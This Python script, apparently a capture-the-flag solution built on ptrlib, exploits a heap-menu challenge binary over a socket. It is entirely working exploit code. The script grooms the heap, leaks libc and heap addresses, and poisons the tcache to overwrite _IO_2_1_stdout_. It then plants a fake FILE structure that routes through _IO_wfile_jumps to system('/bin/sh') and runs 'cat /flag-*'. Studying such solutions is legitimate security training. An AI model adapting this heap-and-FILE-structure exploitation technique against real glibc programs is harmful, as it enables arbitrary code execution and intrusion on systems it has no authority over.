from ptrlib import *
import os

HOST = os.getenv('HOST', 'localhost')
PORT = int(os.getenv('PORT', 9003))

def create(ind, size, alignment, content, newline=True):
  sock.sendlineafter('> ', '1')
  sock.sendlineafter(': ', ind)
  sock.sendlineafter(': ', size)
  sock.sendlineafter(': ', alignment)
  if newline:
      sock.sendlineafter(': ', content)
  else:
      sock.sendafter(': ', content)

def show(ind):
  sock.sendlineafter('> ', '2')
  sock.sendlineafter(': ', ind)
  return sock.recvuntil(b'\n1.', drop=True)

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("./chall")
sock = Socket(HOST, PORT)

create(0, 0x18, 0x80, b"A"*0x10)
create(0, 0x18, 0x100, b"B"*0x10)
create(0, 0x18, 0x100, b"C"*0x10)
create(0, 0x18, 0x100, b"D"*0x10)
create(0, 0x18, 0x100, b"E"*0x10)
create(0, 0x128, 0x120, b"F"*0x100 + p64(0x4f0) + p64(0x51))
create(0, 0x128, 0x120, b"F"*0x120)
create(0, 0xb8-0x20-0x20, 0x20, p64(0) + p64(0xdeadbeef) + p64(0)*2)
payload  = b"0"*0x18
payload += p64(0x61)
payload += b"1"*0x58
payload += p64(0x21)
payload += b"C"*0x18
payload += p64(0x4f1)
create(0, 0, 0x80, payload)
create(0, 0xc8-0x20-0x20, 0x20, b"X"*0x10)
create(1, 0x48, 0x20, b"a"*0x40)
create(2, 0x48, 0x20, b"a"*0x40)
create(0, 0x18, 0x20, b"b"*0x0)
create(0, 0x18, 0x20, b"b"*0x0)
create(0, 0x18, 0x20, b"b"*0x0)
create(0, 0x18, 0x20, b"b"*0x0)

libc.base = u64(show(1)) - libc.main_arena() - 0x60
create(0, 0x18, 299, b"A"*0x10)
heap_base = u64(show(2)) - 0x310
logger.info("heap = " + hex(heap_base))

create(0, 0x18, 0, "neko")
payload  = b"2" * 0x100
payload += p16(0x0101) * 0x40
payload += p64(libc.symbol('_IO_2_1_stdout_')) * 0x40
create(0, 0, 0x20, payload)
addr_IO_wfile_jumps = libc.base + 0x2160c0
fake_file = flat([
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
], map=p64)
fake_file += p64(libc.symbol("system")) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(libc.base + 0x21ba70) # lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stdout_")) # wide_data
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.base + 0x2160c0) # vtable (_IO_wfile_jumps)
fake_file += p64(libc.symbol("_IO_2_1_stdout_") + 8) # _wide_data->_wide_vtable
assert len(fake_file) < 0x100
create(0, 0x100, 0, fake_file)

sock.sendline("\ncat /flag-*")
print(sock.recvuntil(b"}"))
